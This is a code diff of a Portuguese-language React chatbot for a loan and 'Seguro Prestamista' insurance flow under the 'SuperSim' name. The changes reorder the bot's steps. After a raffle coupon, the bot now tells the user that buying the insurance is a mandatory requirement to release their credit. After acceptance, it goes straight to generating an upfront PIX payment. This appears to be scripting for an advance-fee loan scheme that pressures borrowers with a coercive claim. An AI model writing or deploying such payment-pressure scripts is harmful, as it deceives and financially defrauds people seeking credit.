@@ -2368,11 +2368,10 @@ const Chat = () => {
     setTimeout(() => {
       addBotMessages(() => [{
         id: Date.now() + 1,
-        text: `Excelente escolha, ${firstName || "cliente"}! Seguro Prestamista assinado com sucesso!\n\n🎁 Antes de gerar o PIX, você ganhou um benefício exclusivo: seu contrato agora concorre ao **Sorteio Premiado SuperSim**!`,
+        text: `Excelente escolha, ${firstName || "cliente"}! Seguro Prestamista assinado com sucesso!\n\nAgora vou gerar o PIX do pagamento único do Seguro Prestamista para finalizar a ativação do seu contrato.`,
         fromUser: false, time: getNow(), read: true,
       }]).then(() => {
-        // Open the Contrato Premiado modal before PIX generation
-        setTimeout(() => setShowPremiadoModal(true), 600);
+        generatePixPayment();
       });
     }, 500);
   };
@@ -2385,10 +2384,10 @@ const Chat = () => {
     setTimeout(() => {
       addBotMessages(() => [{
         id: Date.now() + 1,
-        text: `Perfeito! Seu cupom da sorte foi registrado com sucesso. 🍀\n\nAgora vou gerar o PIX do pagamento único do Seguro Prestamista para finalizar a ativação do seu contrato.`,
+        text: `Perfeito! Seu cupom da sorte foi registrado com sucesso. 🍀\n\nAgora vamos para a última etapa: a contratação do Seguro Prestamista, exigência obrigatória para liberar seu crédito.`,
         fromUser: false, time: getNow(), read: true,
       }]).then(() => {
-        generatePixPayment();
+        startInsuranceFlow();
       });
     }, 700);
   };
